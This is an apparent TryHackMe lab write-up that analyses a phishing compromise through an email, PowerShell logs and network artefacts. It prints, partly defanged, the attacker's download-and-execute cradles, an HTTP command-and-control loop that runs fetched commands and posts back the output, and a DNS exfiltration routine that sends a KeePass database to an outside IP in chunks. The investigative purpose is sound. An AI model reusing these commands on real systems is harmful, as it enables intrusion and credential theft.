# Boogeyman 1

## Overview

Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation.

[screenshot]

The security team was able to flag the suspicious execution of the attachment, in addition to the phishing reports received from the other finance department employees, making it seem to be a targeted attack on the finance team. Upon checking the latest trends, the initial TTP used for the malicious attachment is attributed to the new threat group named Boogeyman, known for targeting the logistics sector. Our job is to analyse and assess the impact of the compromise.

We are given the following artefacts:

- Copy of the phishing email (`dump[.]eml`)
- Powershell Logs from Julianne's workstation (`powershell[.]json`)
- Packet capture from the same workstation (`capture[.]pcapng`)

## Investigation

### Email Analysis

We are able to extract various information from the provided [dump[.]eml](./dump[.]eml) file, such as sender and victim email address, name of the file inside the encrypted attachment and more. We also have a Base64 encoded payload:

```text
aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
```

Using [Cyberchef](hxxps[://]gchq[.]github[.]io/CyberChef/), we are able to decrypt the payload and see the malicious command:

```bash
iex (new-object net[.]webclient).downloadstring('hxxp[://]files[.]bpakcaging[.]xyz/update')
```

This seems to be downloading a file from a malicious file hosting domain. At this point in our investigation, it is a good idea to pivot to the powershell logs.

### Downloaded Files

Using `jq`, a lightweight CLI tool for processing json files, we can view the structured data. We can see that the data follows structure similar to the following:

```json
{
  "Timestamp": "2023-01-13 17:12:18.427585Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 558,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.OriginInfo }",
  "ScriptBlockId": "349ed1ba-3ba0-4bca-9bc3-1dc465922c1c",
  "Path": null
}
```

Now lets assume that the attacker used domains for file hosting and C2 (command & control) by making `http` requests. We can see the requests made by using the following command:

```bash
ubuntu@tryhackme:~/Desktop/artefacts$ cat powershell[.]json | jq {ScriptBlockText} | grep http
  "ScriptBlockText": "iex(new-object net[.]webclient).downloadstring('hxxps[://]github[.]com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt[.]ps1');pwd"
  "ScriptBlockText": "$s='cdn[.]bpakcaging[.]xyz:8080';$i='8cce49b0-b86459bb-27fe2489';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{\"X-38d2-8f49\"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb -Headers @{\"X-38d2-8f49\"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{\"X-38d2-8f49\"=$i} -Body ([System[.]Text[.]Encoding][:][:]UTF8[.]GetBytes($e+$r) -join ' ')} sleep 0.8}\n"
  "ScriptBlockText": "iex (new-object net[.]webclient).downloadstring('hxxp[://]files[.]bpakcaging[.]xyz/update')"
  "ScriptBlockText": "iwr hxxp[://]files[.]bpakcaging[.]xyz/sb[.]exe -outfile sb[.]exe;pwd"
  "ScriptBlockText": "iwr hxxp[://]files[.]bpakcaging[.]xyz/sq3[.]exe -outfile sq3[.]exe;pwd"

```

**Note:** I have defanged the output for safety/security

We can see that the domains `files[.]bpakcaging[.]xyz` and `github[.]com` were used to download files, and `cdn[.]bpakcaging[.]xyz` was used for C2. 

The attacker sends an initial beacon to `hxxp[://]cdn[.]bpakcaging[.]xyz:8080/8cce49b0`, and then continously checks in with `hxxp[://]cdn[.]bpakcaging[.]xyz:8080/b86459bb` to retrieve attacker commands. It then executes the retrieved commands, and send the results back to `hxxp[://]cdn[.]bpakcaging[.]xyz:8080/27fe2489`.

The attacker downloaded a `seatbelt[.]exe` file, `sb[.]exe` and `sq3[.]exe`. Although the domain `files[.]bpakcaging[.]xyz` does not exist, I researched that `seatbelt[.]exe` is a C# tool used for enumeration and information gathering. We can confirm the execution of `seatbelt[.]exe`:

```bash
ubuntu@tryhackme:~/Desktop/artefacts$ cat powershell[.]json | jq {ScriptBlockText} | grep seatbelt[.]exe -i
  "ScriptBlockText": "Seatbelt[.]exe -group=user;pwd"
```

We can also see the use of the `sb[.]exe` file, which also seems to be a sort of enumeration tool:

```bash
ubuntu@tryhackme:~/Desktop/artefacts$ cat powershell[.]json | jq {ScriptBlockText} | grep sb[.]exe   
  "ScriptBlockText": ".\\sb[.]exe -group=all;pwd"
  "ScriptBlockText": ".\\sb[.]exe;pwd"
  "ScriptBlockText": ".\\sb[.]exe system;pwd"
  "ScriptBlockText": ".\\sb[.]exe all;pwd"
  "ScriptBlockText": "iwr hxxp[://]files[.]bpakcaging[.]xyz/sb[.]exe -outfile sb[.]exe;pwd"
  "ScriptBlockText": ".\\sb[.]exe -group=user;pwd"
```

Now lets see if a file was accessed by the `sq3[.]exe` binary:

```bash
ubuntu@tryhackme:~/Desktop/artefacts$ cat powershell[.]json | jq {ScriptBlockText} | grep sq3[.]exe -i     
  "ScriptBlockText": ".\\Music\\sq3[.]exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum[.]sqlite \"SELECT * from NOTE limit 100\";pwd"
  "ScriptBlockText": ".\\sq3[.]exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\;pwd"
  "ScriptBlockText": "iwr hxxp[://]files[.]bpakcaging[.]xyz/sq3[.]exe -outfile sq3[.]exe;pwd"
```

It looks like `plum[.]sqlite` was accessed by the binary file.

### Data exfiltration

Let us look at other commands run by the intruder:

```bash
ubuntu@tryhackme:~/Desktop/artefacts$ cat powershell[.]json | jq {ScriptBlockText} | sort | uniq
  "ScriptBlockText": "$file='C:\\Users\\j[.]westcott\\Documents\\protected_data.kdbx'; $destination = \"167[.]71[.]211[.]113\"; $bytes = [System[.]IO[.]File][:][:]ReadAllBytes($file);;pwd"
  "ScriptBlockText": "$file='protected_data.kdbx'; $destination = \"167[.]71[.]211[.]113\"; $bytes = [System[.]IO[.]File][:][:]ReadAllBytes($file);;pwd"
  "ScriptBlockText": "$hex = ($bytes|ForEach-Object ToString X2) -join '';;pwd"
  "ScriptBlockText": "$s='cdn[.]bpakcaging[.]xyz:8080';$i='8cce49b0-b86459bb-27fe2489';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{\"X-38d2-8f49\"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb -Headers @{\"X-38d2-8f49\"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{\"X-38d2-8f49\"=$i} -Body ([System[.]Text[.]Encoding][:][:]UTF8[.]GetBytes($e+$r) -join ' ')} sleep 0.8}\n"
  "ScriptBlockText": "$split = $hex -split '(\\S{50})'; ForEach ($line in $split) { nslookup -q=A \"$line[.]bpakcaging[.]xyz\" $destination;} echo \"Done\";;pwd"
  ...
```

We get some interesting output. It seems like the intruder has exfiltrated the `protected_data.kdbx` file to the IP `167[.]71[.]211[.]113`. They hex encoded the bytes/data of the file using the following command:

```bash
$hex = ($bytes|ForEach-Object ToString X2) -join '';;pwd
```

The intruder then used `nslookup`, which performs DNS queries, to exfiltrate the hex encoded data as a subdomain of the `bpakcaging[.]xyz` domain.